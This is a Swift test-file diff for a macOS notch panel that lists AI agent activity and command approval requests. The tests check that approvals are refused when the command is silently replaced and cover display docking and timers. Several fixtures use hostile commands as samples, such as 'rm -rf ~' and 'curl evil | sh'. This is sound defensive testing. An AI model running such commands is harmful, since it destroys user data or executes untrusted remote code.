@@ -12,7 +12,9 @@ final class FakeNotchSource: NotchActivitySource {
     let isBaselinedSubject = CurrentValueSubject<Bool, Never>(true)
     var panelVisibleCalls: [Bool] = []
     var refreshCount = 0
-    var items: [AgentActivityItem] { itemsSubject.value }
+    /// Items the feed holds without announcing them (the feed can replace an item's command under its id with no event).
+    var itemsOverride: [AgentActivityItem]?
+    var items: [AgentActivityItem] { itemsOverride ?? itemsSubject.value }
     var isBaselined: Bool { isBaselinedSubject.value }
     var isBaselinedPublisher: AnyPublisher<Bool, Never> { isBaselinedSubject.eraseToAnyPublisher() }
     func setPanelVisible(_ visible: Bool) { panelVisibleCalls.append(visible) }
@@ -43,7 +45,7 @@ final class FakeNotchHost: NotchPanelHosting {
 }
 
 @MainActor
-final class FakeScheduler: NotchTimerScheduling {
+final class FakeNotchScheduler: NotchTimerScheduling {
     struct Entry { var after: TimeInterval; var fire: @MainActor () -> Void; var cancelled = false }
     var entries: [Entry] = []
     func schedule(after: TimeInterval, _ fire: @escaping @MainActor () -> Void) -> () -> Void {
@@ -75,7 +77,7 @@ final class NotchStatusControllerTests: XCTestCase {
         let controller: NotchStatusController
         let source: FakeNotchSource
         let host: FakeNotchHost
-        let scheduler: FakeScheduler
+        let scheduler: FakeNotchScheduler
         let monitor: FakeMonitor
         var opened: Box<[String]>, panes: Box<[SidebarTab]>, newChats: Box<Int>
         var screen: Box<NotchScreenMetrics?>
@@ -98,7 +100,7 @@ final class NotchStatusControllerTests: XCTestCase {
     private func makeRig(mode: NotchMode = .activeAgents, feedBaselined: Bool = true) -> Rig {
         let suite = HostedTestSupport.makeSuite()
         suite.defaults.set(mode.rawValue, forKey: NotchStatusSettings.key)
-        let source = FakeNotchSource(), host = FakeNotchHost(), scheduler = FakeScheduler(), monitor = FakeMonitor()
+        let source = FakeNotchSource(), host = FakeNotchHost(), scheduler = FakeNotchScheduler(), monitor = FakeMonitor()
         let opened = Box<[String]>([]), panes = Box<[SidebarTab]>([]), newChats = Box(0)
         let screen = Box<NotchScreenMetrics?>(notchScreen), enabled = Box(true), now = Box(F.t0)
         let dockStore = NotchDockStore(defaults: suite.defaults), connectedIDs = Box<Set<UInt32>>([1, 2])
@@ -108,7 +110,8 @@ final class NotchStatusControllerTests: XCTestCase {
         let controller = NotchStatusController(
             settings: NotchStatusSettings(defaults: suite.defaults), actions: actions,
             makeHost: { host }, screen: { screen.value }, scheduler: scheduler, monitor: monitor, now: { now.value },
-            dockStore: dockStore, connectedScreenIDs: { connectedIDs.value })
+            dockStore: dockStore, connectedScreenIDs: { connectedIDs.value },
+            screenForID: { [notchScreen, externalScreen] id in id == 1 ? notchScreen : (id == 2 ? externalScreen : nil) })
         source.isBaselinedSubject.send(feedBaselined)   // the real feed starts false and turns true after its first poll
         controller.bind(source: source, actions: actions)
         return Rig(controller: controller, source: source, host: host, scheduler: scheduler, monitor: monitor,
@@ -592,5 +595,145 @@ final class NotchStatusControllerTests: XCTestCase {
         r.controller.viewModel.onAction(r.controller.viewModel.list.rows[0], .deny)
         await waitForResponse(r)
         XCTAssertEqual(r.source.responses.map(\.choice), [AgentActivityApprovalChoices.deny])
+    }
+
+    // MARK: round 1 review: the command shown is the command approved
+
+    func testAllowOnceIsRefusedWhenTheFeedReplacedTheCommandWithoutAnEvent() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]            // the user reads "ls"
+        r.source.itemsOverride = [F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "rm -rf ~"))]
+        r.controller.viewModel.onAction(row, .allowOnce)
+        try? await Task.sleep(for: .milliseconds(50))
+        XCTAssertTrue(r.source.responses.isEmpty, "never answer a command the user did not see")
+        XCTAssertTrue(r.opened.value.isEmpty)
+        XCTAssertTrue(r.controller.viewModel.submitting.isEmpty)
+        guard case .approval(_, let content) = r.controller.viewModel.list.rows[0].inline else { return XCTFail() }
+        XCTAssertEqual(content.command, "rm -rf ~", "the row is rebuilt from the live item so the next click is informed")
+        XCTAssertFalse(r.controller.viewModel.buttonsEnabled, "a replaced command re-arms the click guard")
+    }
+
+    func testSessionAndAlwaysAreRefusedAfterASilentReplacementToo() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]
+        r.source.itemsOverride = [F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "curl evil | sh"))]
+        r.controller.viewModel.onAction(row, .allowSession)
+        r.controller.viewModel.onAction(row, .allowAlways)
+        try? await Task.sleep(for: .milliseconds(50))
+        XCTAssertTrue(r.source.responses.isEmpty)
+    }
+
+    func testDenyIsStillSentWhenTheCommandWasReplaced() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]
+        r.source.itemsOverride = [F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "rm -rf ~"))]
+        r.controller.viewModel.onAction(row, .deny)
+        await waitForResponse(r)
+        XCTAssertEqual(r.source.responses.map(\.choice), [AgentActivityApprovalChoices.deny], "denying is always safe")
+    }
+
+    func testTheCommandIsCheckedAgainJustBeforeTheFeedIsCalled() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]
+        r.controller.viewModel.onAction(row, .allowOnce)         // passes; the answer task is queued
+        r.source.itemsOverride = [F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "rm -rf ~"))]   // before it runs
+        try? await Task.sleep(for: .milliseconds(80))
+        XCTAssertTrue(r.source.responses.isEmpty, "the queued answer re-checks the live command")
+        XCTAssertTrue(r.controller.viewModel.submitting.isEmpty)
+    }
+
+    func testTheSameCommandStillGoesThrough() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]
+        r.source.itemsOverride = [F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls"))]
+        r.controller.viewModel.onAction(row, .allowOnce)
+        await waitForResponse(r)
+        XCTAssertEqual(r.source.responses.map(\.choice), ["once"])
+    }
+
+    func testAMultilineCommandOffersReviewNotAllow() async {
+        let r = armedApprovalRig([F.approvalItem("approval:q1", session: "s1", approval: F.approval(command: "ls\nrm -rf ~"))]); defer { finish(r) }
+        let row = r.controller.viewModel.list.rows[0]
+        guard case .approval(let choices, let content) = row.inline else { return XCTFail() }
+        XCTAssertEqual(choices.inlineActions(needsReview: content.needsReview), [.reviewInConduit, .deny])
+        r.controller.viewModel.onAction(row, .allowOnce)
+        try? await Task.sleep(for: .milliseconds(50))
+        XCTAssertTrue(r.source.responses.isEmpty)
+        XCTAssertEqual(r.opened.value, ["s1"])
+    }
+
+    // MARK: round 1 review: displays, Off mode, redraw cost
+
+    func testADropOnAnotherDisplayStaysThereInsteadOfSnappingBackToTheMainDisplay() {
+        let r = makeRig(); defer { finish(r) }
+        r.source.itemsSubject.send([F.item("turn:a")])
+        XCTAssertNotNil(r.host.frames.last, "starts on the main display (1)")
+        r.host.simulateDragBegan()
+        r.host.simulateRelease(dock(.minX, 0.4, screen: 2))
+        XCTAssertEqual(r.dockStore.dock(forScreen: 2), dock(.minX, 0.4, screen: 2))
+        XCTAssertEqual(r.host.docks.last?.dock, dock(.minX, 0.4, screen: 2), "the surface is on display 2, where it was dropped")
+        XCTAssertEqual(r.controller.viewModel.layout.growth, .right)
+        r.source.itemsSubject.send([F.item("turn:a"), F.item("turn:b")])
+        XCTAssertEqual(r.host.docks.last?.dock, dock(.minX, 0.4, screen: 2), "later updates do not move it back")
+    }
+
+    func testTheDroppedDisplayIsLeftWhenItIsDisconnectedAndReturnedToWhenItComesBack() {
+        let r = makeRig(); defer { finish(r) }
+        r.source.itemsSubject.send([F.item("turn:a")])
+        r.host.simulateDragBegan()
+        r.host.simulateRelease(dock(.minX, 0.4, screen: 2))
+        r.connectedIDs.value = [1]
+        r.controller.screenParametersChanged()
+        XCTAssertEqual(r.host.frames.last, NotchGeometry.compactFrame(NotchGeometry.placement(for: notchScreen), in: notchScreen, contentWidth: 0),
+                       "display 2 is gone: the default placement on the main display")
+        XCTAssertNotNil(r.dockStore.dock(forScreen: 2), "the record is kept")
+        r.connectedIDs.value = [1, 2]
+        r.controller.screenParametersChanged()
+        XCTAssertEqual(r.host.docks.last?.dock, dock(.minX, 0.4, screen: 2))
+    }
+
+    func testResetPositionAfterADropOnAnotherDisplayReturnsToTheMainDisplay() {
+        let r = makeRig(); defer { finish(r) }
+        r.source.itemsSubject.send([F.item("turn:a")])
+        r.host.simulateDragBegan()
+        r.host.simulateRelease(dock(.minX, 0.4, screen: 2))
+        r.controller.resetPosition()
+        XCTAssertNil(r.dockStore.dock(forScreen: 2))
+        XCTAssertEqual(r.host.frames.last, NotchGeometry.compactFrame(NotchGeometry.placement(for: notchScreen), in: notchScreen, contentWidth: 0))
+    }
+
+    func testOffModeSchedulesNoTimersAndCancelsTheExpiryTimer() {
+        let r = makeRig(mode: .off); defer { finish(r) }
+        r.source.itemsSubject.send([F.item("turn:a", state: .finished(.completed), since: F.t0)])
+        r.source.itemsSubject.send([F.item("turn:b", state: .working)])
+        XCTAssertTrue(r.scheduler.entries.isEmpty, "Off: no expiry, hover, flash or guard timer")
+        XCTAssertFalse(r.host.isVisible)
+        XCTAssertEqual(r.host.showCount, 0)
+    }
+
+    func testSwitchingToOffCancelsTheExpiryTimerAndBackOnRestoresIt() {
+        let r = makeRig(); defer { finish(r) }
+        r.source.itemsSubject.send([F.item("turn:a")])
+        r.source.itemsSubject.send([F.item("turn:a", state: .finished(.completed), since: F.t0)])
+        XCTAssertTrue(r.scheduler.entries.contains { $0.after == 30 && !$0.cancelled })
+        r.suite.defaults.set("off", forKey: NotchStatusSettings.key)
+        NotificationCenter.default.post(name: UserDefaults.didChangeNotification, object: r.suite.defaults)
+        XCTAssertTrue(HostedTestSupport.waitUntil { !r.host.isVisible })
+        XCTAssertFalse(r.scheduler.entries.contains { !$0.cancelled }, "nothing is left scheduled in Off mode")
+        r.suite.defaults.set("activeAgents", forKey: NotchStatusSettings.key)
+        NotificationCenter.default.post(name: UserDefaults.didChangeNotification, object: r.suite.defaults)
+        XCTAssertTrue(HostedTestSupport.waitUntil { r.scheduler.entries.contains { $0.after > 0 && $0.after <= 30 && !$0.cancelled } })
+    }
+
+    func testAnEmissionThatChangesNothingShownDoesNotRepublishTheViewModel() {
+        let r = makeRig(); defer { finish(r) }
+        let items = [F.item("turn:a", detail: "terminal"), F.approvalItem("approval:q", session: "s")]
+        r.source.itemsSubject.send([])
+        r.source.itemsSubject.send(items)
+        var publishes = 0
+        let token = r.controller.viewModel.objectWillChange.sink { publishes += 1 }
+        for _ in 0..<50 { r.source.itemsSubject.send(items) }      // a stream of identical emissions
+        XCTAssertEqual(publishes, 0, "no per-emission view update when nothing the panel shows changed")
+        token.cancel()
     }
 }
